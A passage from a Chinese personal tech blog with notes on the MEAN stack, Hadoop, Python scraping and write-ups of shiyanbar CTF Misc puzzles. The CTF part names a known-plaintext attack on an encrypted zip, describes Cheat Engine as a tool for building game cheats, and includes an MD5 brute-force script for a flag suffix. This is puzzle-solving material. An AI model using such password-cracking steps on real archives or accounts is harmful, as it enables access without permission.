<h3 id="1-2"><a href="#1-2" class="headerlink" title="- 1.2"></a>- 1.2</h3><p>从传统数据库（如 MySQL）–&gt;非关系数据库 (如NoSQL）–&gt;无架构的、以文档为导向的持久存储（如 MongoDB），这些代表着持久化策略发生了根本性的转变。用户花费在编写 SQL 上的时间将会减少，将会有更多的时间编写 JavaScript 中的映射/化简功能。用户还能省掉大量的转换逻辑，因为 MongoDB 可以在本地运行 JavaScript Object Notation (JSON)。因此，编写 RESTful Web 服务变得前所未有的容易。 从 LAMP 到MEAN的最大转变在于从传统的服务器端页面生成变为客户端 单页面应用程序 (SPA)。借助 Express仍然可以处理服务器端的路由与页面生成，但目前的重点在客户端视图上，而 AngularJS 可以实</p>

      
    </div>
    <footer class="article-footer">
      
      
      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-实验吧Misc题目"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2016/10/05/实验吧Misc题目/">实验吧Misc题目</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2016/10/05/实验吧Misc题目/" class="article-date">
	  <time datetime="2016-10-05T15:53:56.000Z" itemprop="datePublished">2016-10-05</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="实验吧Misc题目"><a href="#实验吧Misc题目" class="headerlink" title="实验吧Misc题目"></a>实验吧Misc题目</h1><p><a href="http://shackles.top/2016/10/08/%E5%AE%9E%E9%AA%8C%E5%90%A7MISC/"> 2016-10-08</a></p>
<h3 id="1、-这就是一个坑"><a href="#1、-这就是一个坑" class="headerlink" title="1、 这就是一个坑"></a>1、 这就是一个坑</h3><p><strong>QUESTION:</strong> 密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？</p>
<p><strong>TIP:</strong> ARCHPR对flag.zip进行<strong>明文攻击</strong>,CRP相同。</p>
<p><strong>ANSWER:</strong> 我们打开压缩包的tips.txt，里面提示：密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？！<br>这个tip告诉我们爆破是基本不可能了<br>然后我们发现falg.zip里面也有个tips.txt，然后我猜想flag.zip里面的tips.txt和另外一个tips.txt是不是同一个文件<br>然后把tips.txt压缩后可以发现，他们两个的crc32是一样的.</p>
<h3 id="2、CheatEngine"><a href="#2、CheatEngine" class="headerlink" title="2、CheatEngine"></a>2、CheatEngine</h3><p><strong>QUESTION:</strong></p>
<p><strong>TIP:</strong> CE工具的使用，Cheat Engine 是一款内存修改编辑工具 ，它允许你修改你的游戏或软件内存数据，以得到一些其他功能。它包括16进制编辑，反汇编程序，内存查找工具。与同类修改工具相比，它具有强大的反汇编功能，且自身附带了外挂制作工具，可以用它直接生成外挂。</p>
<p><strong>ANSWER:</strong><br><a href="http://www.shiyanbar.com/ctf/writeup/1046/" target="_blank" rel="noopener">link</a></p>
<h3 id="4、-图片里的动漫"><a href="#4、-图片里的动漫" class="headerlink" title="4、 图片里的动漫"></a>4、 图片里的动漫</h3><p><strong>QUESTION:</strong> 一恒河沙中有三千世界，一张图里也可以有很多东西。<br>答案是与一部动漫名字有关的小写英文字母。</p>
<p><strong>TIP:</strong> 遇见此类型的题先binwak， 再 foremost； 文件隐藏，根据文件头判断。file命令;</p>
<p><strong>ANSWER:</strong></p>
<h3 id="6、Canon"><a href="#6、Canon" class="headerlink" title="6、Canon"></a>6、Canon</h3><p><strong>QUESTION:</strong></p>
<p><strong>TIP:</strong> mp3文件和一个加密过的zip ，上MP3stego；<strong>MP3stego</strong>加密mp3，需要秘钥即为题目Cannon；得到base64，解密的CTF{}。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode.exe -X -P Canon music.mp3 // 解密；</span><br></pre></td></tr></table></figure>
<p><strong>ANSWER:</strong></p>
<h3 id="7、ROT-13变身了"><a href="#7、ROT-13变身了" class="headerlink" title="7、ROT-13变身了"></a>7、ROT-13变身了</h3><p><strong>QUESTION:</strong> 提示：1、回旋13，回不回？ 2、有81,450,625种可能性</p>
<p>格式：flag{}破解下面的密文：</p>
<p>83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112</p>
<p>flag格式flag{}</p>
<p><strong>TIP:</strong> ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。<br><strong>先对每个数字减去13后，再chr（）转换成字符.</strong></p>
<p><strong>ANSWER:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># rot13 -13 chr() 字符</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">lst=[83,89,78,84,45,86,96,45,115,121,110,116,136,132,132,132,108,128,117,118,134,110,123,111,110,127,108,112,124,122,108,118,128,108,131,114,127,134,108,116,124,124,113,108,76,76,76,76,138,23,90,81,66,71,64,69,114,65,112,64,66,63,69,61,70,114,62,66,61,62,69,67,70,63,61,110,110,112,64,68,62,70,61,112,111,112]</span><br><span class="line">	lst=[chr(i-13) for i in lst]</span><br><span class="line">	print &quot;&quot;.join(lst)</span><br></pre></td></tr></table></figure>
<p>这样就会得到<br>FLAG IS flag{www_shiyanbar_com_is_very<em>good</em>????}<br>MD5:38e4c352809e150186920aac37190cbc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">#根据MD5爆破后四位</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">a = &apos;38e4c352809e150186920aac37190cbc&apos;</span><br><span class="line"></span><br><span class="line">dic = r&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~ &quot;</span><br><span class="line"></span><br><span class="line">for i1 in dic:</span><br><span class="line">	for i2 in dic:</span><br><span class="line">		for i3 in dic:</span><br><span class="line">			for i4 in dic:</span><br><span class="line">				md5 = hashlib.md5()</span><br><span class="line">				b = &apos;flag&#123;www_shiyanbar_com_is_very_good_&apos; +i1+i2+i3+i4+&apos;&#125;&apos;</span><br><span class="line">				md5.update(b)</span><br><span class="line">				if md5.hexdigest() == a:</span><br><span class="line">					print &apos;%s  %s&apos; %(md5.hexdigest(),b)</span><br></pre></td></tr></table></figure>
<p>得flag{www_shiyanbar_com_is_very<em>good</em>@8Mu}</p>
<h3 id="8、解码磁带"><a href="#8、解码磁带" class="headerlink" title="8、解码磁带"></a>8、解码磁带</h3><p><strong>QUESTION:</strong> <a href="http://ctf5.shiyanbar.com/misc/cidai.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/misc/cidai.html</a></p>
<p><strong>TIP:</strong></p>
<p><strong>ANSWER:</strong></p>
<h3 id="9、功夫秘籍"><a href="#9、功夫秘籍" class="headerlink" title="9、功夫秘籍"></a>9、功夫秘籍</h3><p><strong>QUESTION:</strong></p>
<p><strong>TIP:</strong><br>.png文件，找到key is VF95c0s5XzVyaGtfX3VGTXR9M0Vse251QEUg</p>
<p>base64：T_ysK9_5rhk__uFMt}3El{nu@E //base64 为36位，这是个坑。解出来加上空格。</p>
<p>栅栏：3位 Th3_kEy<em>ls</em>{Kun9Fu_M@5tEr}</p>
<p><strong>ANSWER:</strong><br>Kun9Fu_M@5tEr 提交这个；</p>
<h3 id="10、WTF"><a href="#10、WTF" class="headerlink" title="==10、WTF=="></a>==10、WTF==</h3><p><strong>QUESTION:</strong> <a href="http://ctf5.shiyanbar.com/423/misc/code.txt" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/misc/code.txt</a><br>通过奇怪的字符串发现其中隐藏的信息</p>
<p><strong>TIP:</strong></p>
<p><strong>ANSWER:</strong></p>
<h3 id="12、-有趣的文件"><a href="#12、-有趣的文件" class="headerlink" title="12、==有趣的文件=="></a>12、==有趣的文件==</h3><p><strong>QUESTION:</strong><br>这是一个有趣的文件，打开看看你能想到什么<br>格式：CTF{ }<br>解题链接： <a href="http://ctf5.shiyanbar.com/misc/funfile" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/misc/funfile</a><br><strong>TIP:</strong></p>
<p><strong>ANSWER:</strong><br><a href="http://www.shiyanbar.com/ctf/writeup/513" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/writeup/513</a></p>
<p><strong>QUESTION:</strong></p>
<p><strong>TIP:</strong></p>
<p><strong>ANSWER:</strong></p>
<h3 id="13、Paint"><a href="#13、Paint" class="headerlink" title="13、Paint"></a>13、Paint</h3><p><strong>QUESTION:</strong><br>matplotlib画图<br><strong>TIP:</strong></p>
<p><strong>ANSWER:</strong></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-大数据"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2016/10/05/大数据/">大数据初探</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2016/10/05/大数据/" class="article-date">
	  <time datetime="2016-10-05T15:53:56.000Z" itemprop="datePublished">2016-10-05</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="大数据初探"><a href="#大数据初探" class="headerlink" title="大数据初探"></a>大数据初探</h2><p>FrontPage -Hadoop Wiki</p>
<p><a href="https://wiki.apache.org/hadoop/" target="_blank" rel="noopener">https://wiki.apache.org/hadoop/</a></p>
<p>Hadoop简介 | Hadoop Notebook</p>
<p><a href="https://pennywong.gitbooks.io/hadoop-notebook/content/introduction.html" target="_blank" rel="noopener">https://pennywong.gitbooks.io/hadoop-notebook/content/introduction.html</a></p>
<p>细细品味Hadoop- 随笔分类 - 虾皮 - 博客园</p>
<p><a href="http://www.cnblogs.com/xia520pi/category/346943.html" target="_blank" rel="noopener">http://www.cnblogs.com/xia520pi/category/346943.html</a></p>
<p>HDFS 原理、架构与特性介绍 - OPEN 开发经验库</p>
<p><a href="http://www.open-open.com/lib/view/open1376228205209.html" target="_blank" rel="noopener">http://www.open-open.com/lib/view/open1376228205209.html</a></p>
<p>free-programming-books/free-programming-books-zh.mdat master · vhf/free-programming-books</p>
<p><a href="https://github.com/vhf/free-programming-books/blob/master/free-programming-books-zh.md" target="_blank" rel="noopener">https://github.com/vhf/free-programming-books/blob/master/free-programming-books-zh.md</a></p>
<p>Hadoop家族学习路线图| 粉丝日志</p>
<p><a href="http://blog.fens.me/hadoop-family-roadmap/" target="_blank" rel="noopener">http://blog.fens.me/hadoop-family-roadmap/</a></p>
<p>ApacheNutch™ -</p>
<p><a href="http://nutch.apache.org/" target="_blank" rel="noopener">http://nutch.apache.org/</a>  nutch  开源搜索引擎</p>
<p><a href="http://wiki.jikexueyuan.com/project/hadoop/" target="_blank" rel="noopener">http://wiki.jikexueyuan.com/project/hadoop/</a></p>
<ul>
<li>分布式：一个业务分拆多个子业务，部署在不同的服务器上</li>
<li>集群：同一个业务，部署在多个服务器上</li>
</ul>
<p>集群是个物理形态，分布式是个工作方式。</p>
<p>《大型网站技术架构》网站的高性能架构及优化 - passionfly</p>
<p><a href="https://my.oschina.net/u/2260265/blog/501289" target="_blank" rel="noopener">https://my.oschina.net/u/2260265/blog/501289</a></p>
<p>亿级PV超大型网站集群架构图形化深度揭秘讲解 - CSDN学院 - CSDN</p>
<p><a href="http://edu.csdn.net/course/detail/2278?ref=blog&amp;loc=0" target="_blank" rel="noopener">http://edu.csdn.net/course/detail/2278?ref=blog&amp;loc=0</a></p>
<p>负载均衡层次结构：LVS Nginx DNS CDN - 纸上得来终觉浅，绝知此事要躬行。 - 博客频道 - CSDN.NET</p>
<p><a href="http://blog.csdn.net/boonya/article/details/51064482" target="_blank" rel="noopener">http://blog.csdn.net/boonya/article/details/51064482</a></p>
<p>大型网站数据库架构演变</p>
<p><a href="http://www.infoq.com/cn/presentations/large-website-databas-architecture-evolution" target="_blank" rel="noopener">http://www.infoq.com/cn/presentations/large-website-databas-architecture-evolution</a></p>
<ul>
<li>大数据</li>
</ul>
<ul>
<li>云计算</li>
</ul>
<ul>
<li>虚拟化</li>
<li>物联网</li>
</ul>
<h3 id="Apache-家族"><a href="#Apache-家族" class="headerlink" title="Apache 家族"></a>Apache 家族</h3><p>l  <a href="http://hadoop.apache.org/" target="_blank" rel="noopener">Apache Hadoop</a>：是Apache开源组织的一个分布式计算开源框架，提供了一个分布式文件系统子项目（HDFS）和支持MapReduce分布式计算的软件架构。</p>
<p>l  <a href="http://hive.apache.org/" target="_blank" rel="noopener">Apache Hive</a>：是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，通过类MapReduce统计，不必开发专门的MapReduce应用，十分适合数据仓库的统计分析。</p>
<p>l  <a href="http://pig.apache.org/" target="_blank" rel="noopener">Apache Pig</a>：是一个基于Hadoop的大规模数据分析工具，它提供的SQL-LIKE语言叫Pig Latin，该语言的编译器会把类SQL的数据分析请求转换为一系列经过优化处理的MapReduce运算。</p>
<p>l  <a href="http://hbase.apache.org/" target="_blank" rel="noopener">Apache HBase</a>：是一个高可靠性，高性能，面向列，可伸缩的分布式存储系统，利用HBase技术可以在廉价PC服务器上搭建起大规模结构化存储集群。</p>
<p>l  <a href="http://sqoop.apache.org/" target="_blank" rel="noopener">Apache Sqoop</a>：是一个用来将Hadoop和关系型数据库中的数据相互转移的工具，可以将一个关系型数据库（MySQL，Oracle，Postgres等）中的数据导入到Hadoop的HDFS中，也可以将HDFS的数据导入到关系型数据库中。</p>
<p>l  <a href="http://zookeeper.apache.org/" target="_blank" rel="noopener">Apache Zookeeper</a>：是一个为分布式应用所设计的分布的，开源的协调服务，它主要是用于解决分布式应用中经常遇到的一些数据管理问题，简化分布式应用协调及其管理的难度，提供高性能的分布式服务</p>
<p>l  <a href="http://mahout.apache.org/" target="_blank" rel="noopener">Apache Mahout</a>：是基于Hadoop的机器学习和数据挖掘的一个分布式框架.Mahout用MapReduce实现了部分数据挖掘算法，解决了并行挖掘的问题。</p>
<p>l  <a href="http://cassandra.apache.org/" target="_blank" rel="noopener">Apache Cassandra</a>：是一套开源分布式NoSQL数据库系统。它最初由Facebook开发，用于储存简单格式数据，集合Google BigTable的数据模型与Amazon Dynamo的完全分布式的架构于一身</p>
<p>l  <a href="http://avro.apache.org/" target="_blank" rel="noopener">Apache Avro</a>：是一个数据序列化系统，设计用于支持数据密集型，大批量数据交换的应用.Avro是新的数据序列化格式与传输工具，将逐步取代Hadoop原有的IPC机制</p>
<p>l  <a href="http://incubator.apache.org/ambari/" target="_blank" rel="noopener">Apache Ambari</a>：是一种基于Web的工具，支持Hadoop集群的供应，管理和监控。</p>
<p>l  <a href="http://incubator.apache.org/chukwa/" target="_blank" rel="noopener">Apache Chukwa</a>：是一个开源的用于监控大型分布式系统的数据收集系统，它可以将各种各样类型的数据收集成适合Hadoop处理的文件保存在HDFS中供Hadoop进行各种MapReduce操作。</p>
<p>l  <a href="http://hama.apache.org/" target="_blank" rel="noopener">Apache Hama</a>：是一个基于HDFS的BSP（Bulk Synchronous Parallel）并行计算框架，Hama可用于包括图，矩阵和网络算法在内的大规模，大数据计算。</p>
<p>l  <a href="http://flume.apache.org/" target="_blank" rel="noopener">Apache Flume</a>：是一个分布的，可靠的，高可用的海量日志聚合的系统，可用于日志数据收集，日志数据处理，日志数据传输。</p>
<p>l  <a href="http://giraph.apache.org/" target="_blank" rel="noopener">Apache Giraph</a>：是一个可伸缩的分布式迭代图处理系统，基于Hadoop平台，灵感来自BSP（批量同步并行）和Google的Pregel。</p>
<p>l  <a href="http://oozie.apache.org/" target="_blank" rel="noopener">Apache Oozie</a>：是一个工作流引擎服务器，用于管理和协调运行在Hadoop平台上（HDFS，Pig和MapReduce）的任务。</p>
<p>l  <a href="http://incubator.apache.org/crunch/" target="_blank" rel="noopener">Apache Crunch</a>：是基于Google的FlumeJava库编写的Java库，用于创建MapReduce程序。与Hive，Pig类似，Crunch提供了用于实现如连接数据，执行聚合和排序记录等常见任务的模式库</p>
<p>l  <a href="http://whirr.apache.org/" target="_blank" rel="noopener">Apache Whirr</a>：是一套运行于云服务的类库（包括Hadoop），可提供高度的互补性.Whirr学支持Amazon EC2和Rackspace的服务。</p>
<p>l  <a href="http://bigtop.apache.org/" target="_blank" rel="noopener">Apache Bigtop</a>：是一个对Hadoop及其周边生态进行打包，分发和测试的工具。</p>
<p>l  <a href="http://incubator.apache.org/hcatalog/" target="_blank" rel="noopener">Apache HCatalog</a>：是基于Hadoop的数据表和存储管理，实现中央的元数据和模式管理，跨越Hadoop和RDBMS，利用Pig和Hive提供关系视图。</p>
<p>l  <a href="http://cloudera.github.io/hue/" target="_blank" rel="noopener">Cloudera Hue</a>：是一个基于WEB的监控和管理系统，实现对HDFS，MapReduce / YARN，HBase，Hive，Pig的web化操作和管理。</p>
<h3 id="Apache-Hadoop"><a href="#Apache-Hadoop" class="headerlink" title="Apache Hadoop"></a><strong>Apache Hadoop</strong></h3><p>​    Apache™Hadoop®项目开发用于可靠，可扩展，分布式计算的开源软件。</p>
<p>Apache Hadoop软件库是一个框架，允许使用简单的编程模型跨计算机集群分布式处理大型数据集。它的设计是从单个服务器扩展到数千个机器，每个都提供本地计算和存储。不是依靠硬件来提供高可用性，库本身设计用于检测和处理应用程序层的故障，因此在计算机集群之上提供高可用性服务，每个计算机都可能容易出现故障。</p>
<p>​    该项目包括以下模块：</p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml\awefwafea.png" alt="wefwafe"></p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml\waefwaf.png" alt="aefwa"></p>
<p>l <strong>Hadoop Common</strong>：支持其他Hadoop模块的常用实用程序。</p>
<p>l <strong>Hadoop**</strong>分布式文件系统<strong>**（HDFS™）</strong>：提供对应用程序数据的高吞吐量访问的分布式文件系统。  C盘 D盘</p>
<p>l <strong>Hadoop YARN</strong>：作业调度和集群资源管理的框架。        分布式资源管理                  类似操作系统</p>
<p>l <strong>Hadoop MapReduce</strong>：一种基于YARN的大数据集并行处理系统。               visual studio</p>
<p><strong>云计算是一种服务;虚拟化和分布式系统都是用来实现云计算的关键技术之一。</strong></p>
<p>目前来讲虚拟化主要常用两个核心技术：<strong>服务器虚拟化</strong>，与<strong>应用虚拟化</strong></p>
<p>目前来讲分布式系统主要用到的两个核心技术：<strong>分布式存储</strong>，与<strong>分布式计算</strong></p>
<h4 id="Apache的其他Hadoop相关项目包括："><a href="#Apache的其他Hadoop相关项目包括：" class="headerlink" title="Apache的其他Hadoop相关项目包括："></a>Apache的其他Hadoop相关项目包括：</h4><p>l <a href="http://incubator.apache.org/ambari/" target="_blank" rel="noopener"><strong>Ambari™</strong></a>：用于配置，管理和监控Apache Hadoop集群的基于Web的工具，其中包括支持Hadoop HDFS，Hadoop MapReduce，Hive，HCatalog，HBase，ZooKeeper，Oozie，Pig和Sqoop。Ambari还提供了一个用于查看集群健康的仪表板，如热图，以及以视觉方式查看MapReduce，Pig和Hive应用程序的功能，以便以用户友好的方式诊断其性能特征。</p>
<p>l <a href="http://avro.apache.org/" target="_blank" rel="noopener"><strong>Avro™</strong></a>：数据串行化系统。</p>
<p>l <a href="http://cassandra.apache.org/" target="_blank" rel="noopener"><strong>Cassandra™</strong></a>：可扩展的多主数据库，无单点故障。</p>
<p>l <a href="http://incubator.apache.org/chukwa/" target="_blank" rel="noopener"><strong>Chukwa™</strong></a>：用于管理大型分布式系统的数据收集系统。</p>
<p>l <a href="http://hbase.apache.org/" target="_blank" rel="noopener"><strong>HBase™</strong></a>：一个可扩展的分布式数据库，支持大型表的结构化数据存储。</p>
<p>l <a href="http://hive.apache.org/" target="_blank" rel="noopener"><strong>Hive™</strong></a>：提供数据摘要和即席查询的数据仓库基础设施。   数据仓库</p>
<p>l <a href="http://mahout.apache.org/" target="_blank" rel="noopener"><strong>Mahout™</strong></a>：可扩展的机器学习和数据挖掘库。</p>
<p>l <a href="http://pig.apache.org/" target="_blank" rel="noopener"><strong>Pig™</strong></a>：用于并行计算的高级数据流语言和执行框架。</p>
<p>l <a href="http://spark.incubator.apache.org/" target="_blank" rel="noopener"><strong>Spark™</strong></a>：用于Hadoop数据的快速和通用的计算引擎。Spark提供了一个简单和表达性的编程模型，支持各种应用程序，包括ETL，机器学习，流处理和图形计算。</p>
<p>l Tez<a href="http://tez.incubator.apache.org/" target="_blank" rel="noopener"> <strong>™</strong></a>：一个基于Hadoop YARN的通用数据流编程框架，它提供了一个强大而灵活的引擎来执行任务的任意DAG，以便为批处理和交互式用例处理数据。Tez被Hive™，Pig™和Hadoop生态系统中的其他框架以及其他商业软件（如ETL工具）采用，以取代Hadoop™MapReduce作为底层执行引擎。</p>
<p>l <a href="http://zookeeper.apache.org/" target="_blank" rel="noopener"><strong>ZooKeeper™</strong></a>：用于分布式应用程序的高性能协调服务。</p>
<p> HDFS 体系结构</p>
<p> <img src="http://oizzgpxb7.bkt.clouddn.com//ml\3555555555535.png" alt="55555555553"></p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml\533.png" alt="3"></p>
<h4 id="HDFS-体系结构"><a href="#HDFS-体系结构" class="headerlink" title="HDFS 体系结构"></a>HDFS 体系结构</h4><p><img src="http://oizzgpxb7.bkt.clouddn.com//ml\ewafff5.png" alt="wafff"></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/大数据/">大数据</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-Python 爬虫"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2016/08/05/Python 爬虫/">Python 爬虫</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2016/08/05/Python 爬虫/" class="article-date">
	  <time datetime="2016-08-05T15:53:56.000Z" itemprop="datePublished">2016-08-05</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Python-爬虫"><a href="#Python-爬虫" class="headerlink" title="Python 爬虫"></a>Python 爬虫</h1><h2 id="XPath-（lxml-库）"><a href="#XPath-（lxml-库）" class="headerlink" title="XPath  （lxml 库）"></a>XPath  （lxml 库）</h2><p>from lxml import etree</p>
<p>selector=etree.HTML(源码) #将源码转化为能被XPath匹配的格式</p>
<p>selector.xpath(表达式) #返回为一列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/	从根节点选取。</span><br><span class="line">nodename	选取此节点的所有子节点。</span><br><span class="line">//	从当前节点 选择 所有匹配文档中的节点</span><br><span class="line">.	选取当前节点。</span><br><span class="line">..	选取当前节点的父节点。</span><br><span class="line">@	选取属性。</span><br><span class="line">//title[@*]	选取所有带有属性的 title 元素。</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.contains ()： //div[contains(@id,&apos;in&apos;)] ,表示选择id中包含有’in’的div节点</span><br><span class="line">2.text()：由于一个节点的文本值不属于属性，比如“&lt;a class=”baidu“ href=”http://www.baidu.com“&gt;baidu&lt;/a&gt;”,所以，用text()函数来匹配节点：//a[text()=&apos;baidu&apos;]</span><br><span class="line">3.last()：前面已介绍</span><br><span class="line">4.starts-with()： //div[starts-with(@id,&apos;in&apos;)] ，表示选择以’in’开头的id属性的div节点</span><br><span class="line">5.not()函数，表示否定，//input[@name=‘identity’ and not(contains(@class,‘a’))] ，表示匹配出name为identity并且class的值中不包含a的input节点。 not()函数通常与返回值为true or false的函数组合起来用，比如contains(),starts-with()等，但有一种特别情况请注意一下：我们要匹配出input节点含有id属性的，写法如下：//input[@id]，如果我们要匹配出input节点不含用id属性的，则为：//input[not(@id)]</span><br><span class="line"></span><br><span class="line">    author = article.xpath(&apos;div/p/a/text()&apos;).extract()  多选文本</span><br><span class="line">···</span><br><span class="line"></span><br><span class="line">html/body/div[2]/div[3]/div/div[4]/ul/li[@class=&quot;lip selected&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[0].get(&apos;href&apos;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">html = etree.HTML(resHtml)</span><br><span class="line">result = html.xpath(&apos;//tr[@class=&quot;odd&quot;] | //tr[@class=&quot;even&quot;]&apos;)</span><br></pre></td></tr></table></figure>
<h2 id="scrapy：Python-爬虫框架"><a href="#scrapy：Python-爬虫框架" class="headerlink" title="scrapy：Python 爬虫框架"></a>scrapy：Python 爬虫框架</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1 引擎打开一个域名，时蜘蛛处理这个域名，并让蜘蛛获取第一个爬取的URL。</span><br><span class="line">2 引擎从蜘蛛那获取第一个需要爬取的URL，然后作为请求在调度中进行调度。</span><br><span class="line">3 引擎从调度那获取接下来进行爬取的页面。</span><br><span class="line">4 调度将下一个爬取的URL返回给引擎，引擎将它们通过下载中间件发送到下载器。</span><br><span class="line">5 当网页被下载器下载完成以后，响应内容通过下载中间件被发送到引擎。</span><br><span class="line">6 引擎收到下载器的响应并将它通过蜘蛛中间件发送到蜘蛛进行处理。</span><br><span class="line">7 蜘蛛处理响应并返回爬取到的项目，然后给引擎发送新的请求。</span><br><span class="line">7 引擎将抓取到的项目项目管道，并向调度发送请求。</span><br><span class="line">8 系统重复第二部后面的操作，直到调度中没有请求，然后断开引擎与域之间的联系。</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sel = Selector(html_response)</span><br><span class="line">从HTML响应主体中提取所有的  元素，返回:class:Selector 对象(即 SelectorList 的一个对象)的列表:</span><br><span class="line"></span><br><span class="line">sel.xpath(&quot;//h1&quot;)</span><br><span class="line">从HTML响应主体上提取所有 </span><br><span class="line"></span><br><span class="line">元素的文字，返回一个unicode字符串的列表:</span><br></pre></td></tr></table></figure>
<p>sel.xpath(“//h1”).extract()         # this includes the h1 tag<br>sel.xpath(“//h1/text()”).extract()  # this excludes the h1 tag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在所有 &lt;p&gt; 标签上迭代，打印它们的类属性:</span><br><span class="line"></span><br><span class="line">for node in sel.xpath(&quot;//p&quot;):</span><br><span class="line">    print node.xpath(&quot;@class&quot;).extract()</span><br></pre></td></tr></table></figure></p>
<p> response.xpath()<br> response.css()</p>
<h3 id="小Tip"><a href="#小Tip" class="headerlink" title="小Tip:"></a>小Tip:</h3><p>\n -&gt;  ‘,\n’<br>: -&gt;  ‘:’</p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-Python科学计算相关模块学习"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2016/06/05/Python科学计算相关模块学习/">Python科学计算相关模块学习</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2016/06/05/Python科学计算相关模块学习/" class="article-date">
